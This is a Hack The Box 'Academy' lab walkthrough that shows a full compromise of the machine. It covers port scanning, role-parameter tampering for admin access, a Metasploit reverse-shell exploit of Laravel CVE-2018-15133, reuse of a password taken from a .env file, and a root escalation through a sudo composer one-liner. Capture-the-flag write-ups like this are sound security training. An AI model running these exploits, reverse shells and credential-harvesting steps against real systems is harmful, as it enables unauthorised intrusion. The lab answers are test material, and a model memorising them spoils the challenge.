---
id: 959
title: "Academy HTB writeup"
created: 2024-12-12T18:34:22+00:00
url: https://hacklido.com/blog/959-academy-htb-writeup
words: 1592
---

# Academy HTB writeup

[image]

### Task 1: How many TCP ports are open on the remote host?

First let’s kick off with nmap scan. We find three open ports that are open in this machine.

```
`└──╼ [★]$ nmap -A -T4 academy.htb -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 10:41 CST
Nmap scan report for academy.htb (10.129.186.230)
Host is up (0.28s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Hack The Box Academy
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data.`
```

Answer:

```
`3`
```

### Task 2: Which scripting language is the website using?

If we look around the reigistration and login page we see that it ends with `.php` extension and we figure that this website is being run by `php`.

Answer:

```
`php`
```

### Task 3: Which path on the webserver returns an admin login page?

Let’s perform directory bruteforcing on this target and see if we can find something interesting.

```
`feroxbuster -u http://academy.htb -x php`
```

Alternatively feel free to use `dirsearch` also

```
`git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt
python3 dirsearch.py -u http://academy.htb/`
```

Answer:

```
`/admin`
```

### Task 4: Which HTTP POST request parameter on the register page is being used to control the user role?

For this we need to register an user first, and let’s have an look using burp suite and figure out what is happening in the hood and how the request parameter is being processed in the backend.

[image]

Looking at the request made on user register get the our asnwer for the task.

Answer:

```
`roleid`
```

### Task 5: On the “Admin Launch Planner”, the issue regarding which subdomain is still pending to be fixed?

Let’s change the roleid to `1` and see if we can elevate our privileges inside this web app.

We find that we can’t create the same user twice, so this time we set the user to `user1` and using IDOR we tamper the roleid and see if we can see any changes.

We notice that if we login to the same old `/login.php` we find nothing new.

But if we login to the `/admin.php` we see get access to the admin dashboard that has answer to our task.

[image]

Answer:

```
`dev-staging-01.academy.htb`
```

And let’s add this to our `/etc/hosts` configuration.

### Task 6: Which PHP framework is running on the above sub-domain?

Let’s add this domain to our `/etc/hosts` configuration file and then visit, we see that this was built using laravel php framework.

[image]

Answer:

```
`laravel`
```

### Task 7: Which 2018 CVE is the above PHP framework version vulnerable to?

Spent a lot of time for this, I was googling a lot to find ways to enumerate laravel version based off an error, but turns out we can’t so we will be just googling laravel cve 2018 and get answer for this task.

Answer:

```
`CVE-2018-15133`
```

### Task 8 : What is the password for the user cry0l1t3 on the remote host?

Let’s use the information from previous task to gain shell. We will be using metasploit to exploit this cve.

```
`└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search CVE-2018-15133

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec

[msf](Jobs:0 Agents:0) >> use 0
[*] Using configured payload cmd/unix/reverse_perl
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> show options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to target webapp
   VHOST                       no        HTTP server virtual host

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set rhosts 10.129.186.230
rhosts => 10.129.186.230
vhost => http://dev-staging-01.academy.htb
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set lhost 10.10.14.76
lhost => 10.10.14.76
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> run

[*] Started reverse TCP handler on 10.10.14.76:4444
[*] Command shell session 1 opened (10.10.14.76:4444 -> 10.129.186.230:41258) at 2024-12-12 11:53:01 -0600

[*] Command shell session 2 opened (10.10.14.76:4444 -> 10.129.186.230:41260) at 2024-12-12 11:53:02 -0600
[*] Command shell session 3 opened (10.10.14.76:4444 -> 10.129.186.230:41264) at 2024-12-12 11:53:04 -0600
[*] Command shell session 4 opened (10.10.14.76:4444 -> 10.129.186.230:41266) at 2024-12-12 11:53:06 -0600
ls
css
favicon.ico
index.php
js
robots.txt
web.config
whoami
www-data`
```

Looking around we find an `.env` file and let’s grab and reuse the db password.

```
`APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

[snip]`
```

Answer:

```
`mySup3rP4s5w0rd!!`
```

### Task 9: Submit the flag located in the cry0l1t3 user’s home directory.

Now let’s login to user `cry0l1t3` via ssh using DB_PASSWORD

```
`└──╼ [★]$ ssh cry0l1t3@academy.htb
cry0l1t3@academy.htb's password: `
```

We should get the flag using the following command.

```
`cat user.txt`
```

### Task 10: Which interesting group is the user cry0l1t3 a part of?

Use the following command to find the group.

```
`$ cat /etc/passwd | grep -i "cry0l1t3"
cat /etc/group | grep -i "cry0l1t3"
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
$ adm:x:4:syslog,egre55,cry0l1t3
cry0l1t3:x:1002:`
```

Answer:

```
`adm`
```

### Task 11: What is the password for the user mrb3n on the remote host?

The hint for this task says enumerate audit log files. so let’s do it.

```
`$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
[snip]
$ `
```

Answer:

```
`mrb3n_Ac@d3my!`
```

### Task 12: Which command can be run by the user `mrb3n` as the user `root`?

For this task let’s swith to user `mrb3n` first and then enter `sudo -l` to see what we can run as sudo user.

```
`$ su mrb3n
Password:
$ whoami
mrb3n
$ sudo -l
[sudo] password for mrb3n:
Sorry, try again.
[sudo] password for mrb3n:
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer`
```

Answer:

```
`/usr/bin/composer`
```

### Task 13: Submit the flag located on the administrator’s desktop.

Let’s have an look at gtfo bin website on how to abuse this binary and we find an list of steps that will allow us to escalate the privileges. This command creates a temporary directory, writes a malicious `composer.json` file with a script to spawn an interactive shell, and executes it using `sudo composer`, effectively escalating privileges by exploiting the `composer` binary.

```
`TF=$(mktemp -d) echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json sudo composer --working-dir=$TF run-script x`
```

After entering the command you should get your root shell.

```
`# whoami
root
# cat /root/root.txt`
```
